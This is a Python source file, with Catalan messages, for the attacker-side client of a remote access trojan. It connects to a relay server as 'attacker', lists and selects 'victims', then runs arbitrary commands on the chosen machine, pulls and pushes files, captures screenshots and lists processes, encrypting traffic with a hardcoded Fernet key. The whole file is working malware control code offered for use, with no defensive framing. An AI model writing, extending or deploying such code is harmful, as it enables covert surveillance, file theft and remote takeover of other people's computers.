import socket
import os
from cryptography.fernet import Fernet

class ConnectionError(Exception):
    pass

class RemoteClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket()
        self.cipher = Fernet(b'7gBE0tVEzrYOLppvlPklI_vBn-IYnU1OH2UanvcYsIE=')

    def connect(self):
        try:
            self.sock.connect((self.host, self.port))
            self._sendc("attacker")
        except Exception as e:
            raise ConnectionError(f"No s'ha pogut connectar amb el servidor: {e}")

    def get_victims(self):
        victims = self._recvc()
        if victims == "No hi ha víctimes disponibles":
            raise ConnectionError(victims)
        return victims.strip().splitlines()

    def select_victim(self, index):
        self._sendc(index)
        confirm = self._recvc()
        if not confirm.startswith("Conectat"):
            raise ConnectionError(confirm)
        return confirm

    def execute_command(self, command, use_dialog=False):
        cmd = command.strip()
        if cmd.startswith("get"):
            return self._handle_get(cmd)
        elif cmd.startswith("post"):
            return self._handle_post(cmd)
        elif cmd == "ss":
            return self._handle_screenshot()
        elif cmd.startswith("ps"):
            self._sendc(cmd)
            return self._recvc_large()
        elif cmd in ("exit", "total exit"):
            self._sendc(cmd)
            self.sock.close()
            if cmd == "exit":
                return "S'ha tancat la teva connexió amb el servidor"
            return "S'ha tancat la connexió de vícitma i la teva"
        else:
            self._sendc(cmd)
            return self._recvc()

    # --- Comandes especials amb fitxers ---

    def _handle_get(self, command):
        if "::" in command:
            # Format GUI: get remotefile::local_path
            cmd_part, local_path = command.split("::", 1)
            filename = cmd_part.split(" ", 1)[1].strip()
        else:
            # Format CLI: get remotefile
            filename = command.split(" ", 1)[1].strip()
            local_path = filename  # desa al mateix nom en cwd

        self._sendc(f"get {filename}")

        response = self._recvc()
        if response.startswith("EXISTS"):
            filesize = int(response.split(" ")[1])
            self._sendc("READY")
            self._receive_file(local_path, filesize)
            self._recvc()
            return f"Fitxer '{filename}' descarregat correctament\n"
        else:
            return response

    def _handle_post(self, command):
        filename = self._get_filename(command)
        
        self._sendc(command)
        if self._recvc() == "OK":
            file_size = os.path.getsize(filename)
            self._sendc(f"EXISTS {file_size}")
            if self._recvc() == "READY":
                self._send_file(filename)
                return self._recvc()
        return "Error durant la transferència del fitxer\n"

    def _handle_screenshot(self):
        self._sendc("ss")
        response = self._recvc()
        if response.startswith("EXISTS"):
            filesize = int(response.split(" ")[1])
            self._sendc("READY")
            filename = "screenshot.png"
            self._receive_file(filename, filesize)
            self._recvc()
            return f"Captura de pantalla desada com {filename}\n"
        return response

    # --- Utilitats privades ---

    def _sendc(self, message):
        encrypted = self.cipher.encrypt(message.encode())
        self.sock.send(encrypted)

    def _recvc(self):
        data = self.sock.recv(4096)
        return self.cipher.decrypt(data).decode()
    
    def _recvc_large(self):
        enc_size = self.sock.recv(256)
        decrypted_size = self.cipher.decrypt(enc_size.strip()).decode()
        total_size = int(decrypted_size)

        bytes_received = 0
        data = b""
        while bytes_received < total_size:
            chunk = self.sock.recv(min(4096, total_size - bytes_received))
            if not chunk:
                break
            data += chunk
            bytes_received += len(chunk)
        return self.cipher.decrypt(data).decode()

    def _send_file(self, filename):
        with open(filename, 'rb') as f:
            chunk = f.read(4096)
            while chunk:
                self.sock.send(chunk)
                chunk = f.read(4096)
        self._sendc("DONE")

    def _receive_file(self, filename, filesize):
        self.sock.settimeout(5)
        try:
            with open(filename, 'wb') as f:
                received = 0
                while received < filesize:
                    data = self.sock.recv(min(4096, filesize - received))
                    if not data:
                        break
                    f.write(data)
                    received += len(data)
        finally:
            self.sock.settimeout(None)

    def _get_filename(self, command):
        return command.split(' ', 1)[1] if ' ' in command else ''
